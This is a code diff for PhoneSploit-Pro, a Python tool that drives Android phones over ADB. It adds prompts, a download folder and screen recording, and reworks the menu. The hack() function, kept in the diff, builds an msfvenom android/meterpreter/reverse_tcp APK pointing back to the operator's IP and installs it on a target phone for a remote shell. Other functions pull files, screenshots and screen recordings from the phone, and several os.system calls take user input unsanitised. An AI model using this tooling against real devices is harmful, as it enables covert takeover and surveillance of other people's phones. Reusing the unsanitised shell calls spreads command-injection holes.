@@ -9,21 +9,60 @@ from banner import instructions_banner
 from banner import hacking_banner
 
 
+def start():
+    os.system('mkdir -p "Downloaded-Files"')
+    # Checking OS
+    operating_system = platform.system()
+    global clear
+    if operating_system == 'Windows':
+        clear = 'cls'
+    else:
+        check_packages()  # Checking packages in Linux
+
+
 def check_packages():
 
     adb_status = subprocess.call(['which', 'adb'])
     if adb_status != 0:
         print('\nERROR : ADB is NOT installed!\n')
-        print('\nPlease install Android-Tools (adb) to continue.\n')
-        exit_phonesploit_pro()
-        return
+        print('\nPlease install Android-Tools (adb)\n')
+
+        choice = input('\nDo you still want to continue? [Y / N] > ').lower()
+        if choice == 'y':
+            return
+        elif choice == 'n':
+            exit_phonesploit_pro()
+            return
+        else:
+            while choice != 'y' and choice != 'n':
+                choice = input(
+                    '\nInvalid choice!, Press Y or N > ').lower()
+                if choice == 'y':
+                    return
+                elif choice == 'n':
+                    exit_phonesploit_pro()
+                    return
 
     metasploit_status = subprocess.call(['which', 'msfconsole'])
     if metasploit_status != 0:
         print('\nERROR : Metasploit-Framework is NOT installed!\n')
-        print('\nPlease install Metasploit-Framework to continue.\n')
-        exit_phonesploit_pro()
-        return
+        print('\nPlease install Metasploit-Framework\n')
+
+        choice = input('\nDo you still want to continue? [Y / N] > ').lower()
+        if choice == 'y':
+            return
+        elif choice == 'n':
+            exit_phonesploit_pro()
+            return
+        else:
+            while choice != 'y' and choice != 'n':
+                choice = input(
+                    '\nInvalid choice!, Press Y or N > ').lower()
+                if choice == 'y':
+                    return
+                elif choice == 'n':
+                    exit_phonesploit_pro()
+                    return
 
     python_version = platform.python_version()
     if python_version < '3.10':
@@ -38,11 +77,11 @@ def display_menu():
     menu = '''
 
     1. Connect a device             6. Get screenshot                11. Run an app
-    2. List connected devices       7. List installed apps           12. Uninstall an app   
-    3. Disconnect all devices       8. Download file from device     13. Screen Record     
+    2. List connected devices       7. List installed apps           12. Uninstall an app
+    3. Disconnect all devices       8. Download file from device     13. Screen Record
     4. Access device shell          9. Send file to device           14. Restart device
     5. Stop ADB server             10. Install an APK                15. Hack Device (Using Metasploit)
-    
+
     '''
     print(menu)
 
@@ -89,14 +128,59 @@ def get_screenshot():
     print("\nEnter location to save screenshot, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
-        print("\nSaving screenshot to PhoneSploit-Pro directory...\n")
+        destination = 'Downloaded-Files'
+        print(
+            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(
+            f"\nSaving screenshot to {destination}\n")
+
     os.system(f"adb pull /sdcard/screen.png {destination}")
+
+    # Asking to open file
+    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    if choice == 'y':
+        os.system(f"xdg-open {destination}/screen.png")
+
+    elif not choice == 'n':
+        while choice != 'y' and choice != 'n':
+            choice = input(
+                '\nInvalid choice!, Press Y or N > ').lower()
+            if choice == 'y':
+                os.system(f"xdg-open {destination}/screen.png")
+
     print("\n")
 
 
-def stop_adb():
-    os.system("adb kill-server")
-    print("\nStopped ADB Server")
+def screenrecord():
+    time = input("\nEnter the recording duration (in seconds) > ")
+    print('\nStarting Screen Recording...\n')
+    os.system(
+        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
+    print("\nEnter location to save video, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(
+            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(
+            f"\nSaving video to {destination}\n")
+
+    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
+
+    # Asking to open file
+    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    if choice == 'y':
+        os.system(f"xdg-open {destination}/demo.mp4")
+
+    elif not choice == 'n':
+        while choice != 'y' and choice != 'n':
+            choice = input(
+                '\nInvalid choice!, Press Y or N > ').lower()
+            if choice == 'y':
+                os.system(f"xdg-open {destination}/demo.mp4")
+    print("\n")
 
 
 def pull_file():
@@ -104,14 +188,34 @@ def pull_file():
     print("\nEnter location to save file, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
-        print("\nSaving file to PhoneSploit-Pro directory...\n")
+        destination = 'Downloaded-Files'
+        print(f"\nSaving file to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(f"\nSaving file to {destination}\n")
     os.system("adb pull /sdcard/" + location + " " + destination)
+
+    # Asking to open file
+    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    if choice == 'y':
+        os.system(f"xdg-open {destination}/{location}")
+
+    elif not choice == 'n':
+        while choice != 'y' and choice != 'n':
+            choice = input(
+                '\nInvalid choice!, Press Y or N > ').lower()
+            if choice == 'y':
+                os.system(f"xdg-open {destination}/{location}")
 
 
 def push_file():
     location = input("\nEnter file path : ")
     destination = input("Enter destination path : /sdcard/")
     os.system("adb push " + location + " /sdcard/" + destination)
+
+
+def stop_adb():
+    os.system("adb kill-server")
+    print("\nStopped ADB Server")
 
 
 def install_app():
@@ -146,19 +250,6 @@ def list_apps():
         os.system("adb shell pm list packages -3")
     elif mode == 2:
         os.system("adb shell pm list packages")
-    print("\n")
-
-
-def screenrecord():
-    time = input("\nEnter the recording duration (in seconds) > ")
-    print('\nStarting Screen Recording...\n')
-    os.system(
-        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
-    print("\nEnter location to save video, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        print("\nSaving video to PhoneSploit-Pro directory...\n")
-    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
     print("\n")
 
 
@@ -207,7 +298,7 @@ def hack():
     ip = get_ip_address()  # getting IP Address to create payload
     print(f"\nUsing IP Address : {ip} to create payload\n")
     print("\nCreating APK...\n")
-    # creaating payload
+    # creating payload
     os.system(
         f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
     print("\nInstalling APK to target device...\n")
@@ -242,57 +333,55 @@ def main():
     # Clearing the screen and presenting the menu
     # taking selction input from user
     print("\n 99 : Clear Screen                0 : Exit")
-    option = int(input("\n[Main Menu] Enter selection > "))
+    option = input("\n[Main Menu] Enter selection > ")
 
     match option:
-        case 0:
+        case '0':
             exit_phonesploit_pro()
-        case 99:
+        case '99':
             clear_screen()
-        case 1:
+        case '1':
             connect()
-        case 2:
+        case '2':
             list_devices()
-        case 3:
+        case '3':
             disconnect()
-        case 4:
+        case '4':
             get_shell()
-        case 5:
+        case '5':
             stop_adb()
-        case 6:
+        case '6':
             get_screenshot()
-        case 7:
+        case '7':
             list_apps()
-        case 8:
+        case '8':
             pull_file()
-        case 9:
+        case '9':
             push_file()
-        case 10:
+        case '10':
             install_app()
-        case 11:
+        case '11':
             launch_app()
-        case 12:
+        case '12':
             uninstall_app()
-        case 13:
+        case '13':
             screenrecord()
-        case 14:
+        case '14':
             reboot()
-        case 15:
+        case '15':
             hack()
         case other:
             print("\nInvalid selection!\n")
 
 
 # Starting point of the program
+
+# Global variables
 run_phonesploit_pro = True
 clear = 'clear'
 
-# Checking OS
-operating_system = platform.system()
-if operating_system == 'Windows':
-    clear = 'cls'
-else:
-    check_packages()  # Checking packages in Linux
+start()
+
 if run_phonesploit_pro:
     clear_screen()
     while run_phonesploit_pro:
